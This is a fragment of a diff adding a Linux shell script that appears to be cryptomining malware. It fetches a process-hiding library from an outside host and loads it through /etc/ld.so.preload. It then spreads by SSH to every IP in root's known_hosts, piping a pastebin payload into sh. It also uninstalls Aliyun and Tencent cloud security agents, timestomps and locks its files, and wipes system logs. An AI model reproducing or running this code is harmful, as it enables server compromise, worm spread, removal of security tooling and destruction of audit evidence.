+	            wget http://alonecode.ml/libprocesshider.so -O /usr/local/lib/libdns.so && chmod 755 /usr/local/lib/libdns.so && touch -acmr /bin/sh /usr/local/lib/libdns.so && chattr +i /usr/local/lib/libdns.so
+	        fi
+	fi
+	echo /usr/local/lib/libdns.so > /etc/ld.so.preload
+	touch -acmr /bin/sh /etc/ld.so.preload
+	touch -acmr /bin/sh /usr/local/lib/libdns.so
+	chattr -i /etc/ld.so.preload && echo /usr/local/lib/libdns.so > /etc/ld.so.preload && touch -acmr /bin/sh /etc/ld.so.preload
+	if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
+  		for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://pastebin.com/raw/qbbSdzZd||wget -q -O- https://pastebin.com/raw/qbbSdzZd)|sh' & done
+	fi
+	touch -acmr /bin/sh /etc/cron.hourly/oanacroner
+	touch -acmr /bin/sh /etc/cron.daily/oanacroner
+	touch -acmr /bin/sh /etc/cron.monthly/oanacroner
+}
+
+function a() {      #卸载安全程序
+	if ps aux | grep -i '[a]liyun'; then
+		wget http://update.aegis.aliyun.com/download/uninstall.sh
+		chmod +x uninstall.sh
+		./uninstall.sh
+		wget http://update.aegis.aliyun.com/download/quartz_uninstall.sh
+		chmod +x quartz_uninstall.sh
+		./quartz_uninstall.sh
+		rm -f uninstall.sh 	quartz_uninstall.sh
+		pkill aliyun-service
+		rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
+		rm -rf /usr/local/aegis*;
+	elif ps aux | grep -i '[y]unjing'; then
+		/usr/local/qcloud/stargate/admin/uninstall.sh
+		/usr/local/qcloud/YunJing/uninst.sh
+		/usr/local/qcloud/monitor/barad/admin/uninstall.sh
+	fi
+	touch /tmp/.a
+}
+
+mkdir -p /tmp
+chmod 1777 /tmp
+if [ ! -f "/tmp/.a" ]; then
+	a
+fi
+b
+c
+port=$(netstat -an | grep :3333 | wc -l)
+if [ ${port} -eq 0 ];then
+	d
+fi
+if [ ! -f "/tmp/.38t9guft0055d0565u444gtjr0" ]; then
+	e
+fi
+echo 0>/var/spool/mail/root
+echo 0>/var/log/wtmp
+echo 0>/var/log/secure
+echo 0>/var/log/cron
+#
+#
